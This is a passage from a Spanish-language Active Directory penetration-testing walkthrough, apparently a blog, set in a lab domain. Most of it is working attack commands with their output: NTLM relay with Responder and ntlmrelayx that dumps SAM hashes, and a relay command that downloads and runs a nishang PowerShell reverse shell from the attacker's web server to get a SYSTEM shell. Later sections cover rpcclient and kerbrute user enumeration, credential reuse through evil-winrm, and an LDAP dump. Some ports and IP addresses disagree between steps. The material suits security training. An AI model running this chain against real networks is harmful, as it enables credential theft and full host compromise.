SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.0.109   445    SARA             [-] SARA\usuario:Password2 STATUS_LOGON_FAILURE 
SMB         192.168.10.110   445    W1-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
SMB         192.168.10.115   445    W2-PC  [+] waidroc.local\usuario:Password2 
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.120   445    W3-PC        [+] waidroc.local\usuario:Password2 (Pwn3d!)
```

Aquí podemos ver que `usuario` es privilegiado en `W3-PC`. Esto podría deberse a que `usuario` está en el grupo `Administrators` en dicho host.

Ahora, podemos usar una herramienta llamada [`ntlmrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py). Ésta, nos dará la habilidad de añadir un `fichero objetivo`.
Estando dicho fichero en el host `W3-PC`, necesitamos en primer lugar, numerar todos los hosts que están conectados a la red:

```zsh
❯ cme smb 192.168.10.1/24
SMB         192.168.10.120   445    W3-PC        [*] Windows 10.0 Build 19041 x64 (name:W3-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.110   445    W1-PC        [*] Windows 10.0 Build 19041 x64 (name:W1-PC) (domain:waidroc.local) (signing:False) (SMBv1:False)
SMB         192.168.10.115   445    W2-PC  [*] Windows 10.0 Build 17763 x64 (name:W2-PC) (domain:waidroc.local) (signing:True) (SMBv1:False)
SMB         192.168.10.109   445    SARA             [*] Windows 10.0 Build 19041 x64 (name:SARA) (domain:SARA) (signing:False) (SMBv1:False)
```

Podemos ver que nuestro objetivo está conectado a la red (192.168.10.120).

Ponemos en marcha el responder:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FNJO9M3RFSM]
    Responder Domain Name      [BRLS.LOCAL]
    Responder DCE-RPC Port     [48876]

[+] Listening for events...
```

Lanzamos la herramienta `ntlmrelayx`:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Como `usuario` tiene privilegios sobre `cordy`, podemos tomar ventaja de ello para ganar accesoa al recurso inexistente.

Ahora, chequeamos la herramienta `ntlmrelayx`:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, attacking target smb://192.168.10.120
[*] Authenticating against smb://192.168.10.120 as waidroc/usuario SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-7 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
[*] Target system bootKey: 0x9e439fee9a0f33d64ef508d183eafb2f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] SMBD-Thread-8 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
cordy:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.10.120
[*] Stopping service RemoteRegistry
```

Hemos conseguido volcar el fichero SAM, pero con `ntlmrelayx` podríamos hacer cosas más interesantes, como ejecutar comandos en la víctima.
Para ello, tendríamos que ganar acceso al host W3-PC y, para hacerlo, seguimos los siguientes pasos:

Primero, clonamos el repositorio [nishang](https://github.com/samratashok/nishang).
Ahora, nos desplazamos hasta el directorio `Shells` y copiamos el script `Invoke-PowerShellTcp.ps1` a nuestro directorio de trabajo.

```zsh
❯ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
                                                                                       
❯ mv Invoke-PowerShellTcp.ps1 PS.ps1
```

Después, en la última línea del script, añadimos nuestra IP y el puerto.

Ahora, iniciamos con python3 un simple servidor web:

```zsh
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

A su vez, nos quedamos en escucha con `netcat`
```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Volvemos a iniciar el `responder` para el envenenamiento de la red:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.10.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-GSAPAVAME65]
    Responder Domain Name      [8DXY.LOCAL]
    Responder DCE-RPC Port     [49327]

[+] Listening for events...
```

Iniciamos también la herramienta `ntlmrelayx` con los siguientes parámetros:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.10.106:8080/PS.ps1')"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Por útlimo, en la máquina víctima, abrimos el fichero inexistente que acabamos de poner en el host infectado `PS.ps1`.

Si volvemos a chequear el estado de la herramienta `ntlmrelayx` podríamos ver lo siguiente:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.106:8000/PS.ps1')"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, attacking target smb://192.168.10.120
[*] Authenticating against smb://192.168.10.120 as waidroc/usuario SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from waidroc/usuario@192.168.10.110 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
```

Comprobamos la shell donde teníamos `netcat` en ejecución, estando a la escucha, para ver si hemos ganado una reverse shell hacia el host víctima:

```zsh
❯ rlwrap nc -lvnp 4646
listening on [any] 4646 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.10.120] 49788
Windows PowerShell running as user W3-PC$ on W3-PC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> 
```

¡¡HEMOS CONSEGUIDO ACCESO COMO `NT AUTHORITY\SYSTEM` EN W3-PC!!

# Consiguiendo información de los usuarios

- - -

Muchas veces los usuarios ponen información sensible en sus propias descripciones de usuario, como contraseñas, emails (realizar futuro phising para conseguir contraseña), números de teléfono (futuro ataque de ingeniería social)... Por eso, necesitamos enumerar todo para conseguir la mayor información posible.

Si una sesión null de `rpcclient` está disponible, deberías de apagarla **ahora**. Si no esta disponible, estaría mejor, pero siempre corremos el riesgo de que un ataque tenga o consiga las credenciales para poder iniciar la conexión.

Como ejemplo, pongamos que un usuario llamado `mrincognito` tiene una información interesante en su descripción:

```zsh
❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
[Administrator]
[Guest]
[krbtgt]
[cordy]
[usuario]
[mrincognito]
```

También podemos conseguir los IDs de cada uno de los usuarios del sistema (`rid`):

```zsh
❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
0x1f4
0x1f5
0x1f6
0x44f
0x452
0x454
```

Con la siguiente expresión regular, podemos ver toda la información del usuario:

```zsh
❯ for rid in $(rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] For the RID $rid:\n"; rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115 -c "queryuser $rid" | grep -E -i "user name|description" ;done

[+] For the RID 0x1f4:

	User Name   :	Administrator
	Description :	Built-in account for administering the computer/domain

[+] For the RID 0x1f5:

	User Name   :	Guest
	Description :	Built-in account for guest access to the computer/domain

[+] For the RID 0x1f6:

	User Name   :	krbtgt
	Description :	Key Distribution Center Service Account

[+] For the RID 0x44f:

	User Name   :	cordy
	Description :	

[+] For the RID 0x452:

	User Name   :	usuario
	Description :	

[+] For the RID 0x454:

	User Name   :	mrincognito
	Description :	Temporal Password: Mypassword123#
```

Podemos ver que, el usuario `mrincognito` ha dejado una Descripción realmente interesante, la cual nos muestra que la `contraseña temporal es Mypasword123#`.

Intentemos conectarnos vía `evil-winrm`:

```zsh
❯ evil-winrm -i 192.168.10.115 -u mrincognito -p 'Mypassword123#'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mrincognito\Documents> whoami
waidroc\mrincognito
*Evil-WinRM* PS C:\Users\mrincognito\Documents> 
```

En el caso de que este usuario pueda conectase al DC, tendríamos control total sobre la red, por este simple error del usuario.

> En el siguiente recurso, podréis ver como funcionan las conexiones con [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal).
{: .prompt-info}

## Enumerating Admin groups

- - -

Unas de las cosas que tienes que comprobar si dispones de alguna credencial o una null session vía `rpcclient` es enumerar todos los usuarios administradores en busca de información sensible:

```zsh
❯ rpcclient -U 'waidroc.local\usuario%Password2' 192.168.10.115
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
	rid:[0x454] attr:[0x7]
	rid:[0x455] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 25 may 2023 17:36:49 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	mar, 23 may 2023 16:39:28 CEST
	Password can change Time :	mié, 24 may 2023 16:39:28 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000020
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x454
	User Name   :	mrincognito
	Full Name   :	Sabina Romero
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Temporal Password: Mypassword123#
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	jue, 25 may 2023 17:11:24 CEST
	Password can change Time :	vie, 26 may 2023 17:11:24 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x455
	User Name   :	svc_sql
	Full Name   :	SVC_SQLService
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	jue, 25 may 2023 17:45:40 CEST
	Password can change Time :	vie, 26 may 2023 17:45:40 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x455
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> 
```

De nuevo, podemos ver que el usuario `mrincognito` tiene la credencial temporal anotada en la descripción.

> Otra forma de ver la misma información de una manera más organizada sería con la herramienta [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump), la cual veremos en el siguiente apartado.
{: .prompt-tip}

# LDAP Enumeration

- - -

```zsh
❯ service apache2 start
                                                                                                                                                                                                                                
❯ python3 /opt/ldapdomaindump/ldapdomaindump.py -u 'waidroc.local\usuario' -p 'Password2' 192.168.10.115
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                                                                
❯ ls
domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```

Podremos ver toda la información sobre usuarios, políticas, hosts, grupos..., en todos los reportes que la herramienta nos ha realizado en formato `html`



# Kerbrute

- - -

La herramienta `kerbrute` es bastante útil ya que, enumera usuarios de dominio por fuerza bruta gracias al protocolo `kerberos`. Se puede instalar directamente en sistemas basados en debian vía apt (`apt-get install kerbrute`).

```zsh
❯ ./kerbrute userenum users --dc dc.waidroc.local -d waidroc.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/25/23 - Ronnie Flathers @ropnop

2023/05/25 19:54:40 >  Using KDC(s):
2023/05/25 19:54:40 >  	dc.waidroc.local:88

2023/05/25 19:54:40 >  [+] VALID USERNAME:	cordy@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	svc_sql@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	usuario@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	Administrator@waidroc.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	mrincognito@waidroc.local
2023/05/25 19:54:40 >  Done! Tested 7 usernames (5 valid) in 0.033 seconds
```

> Debemos de escoger un buen diccionario para enumerar usuarios potenciales. Un buen repositorio de diccionarios y que uso un montón, es el de [`Seclists`](https://github.com/danielmiessler/SecLists).
{: .prompt-tip}














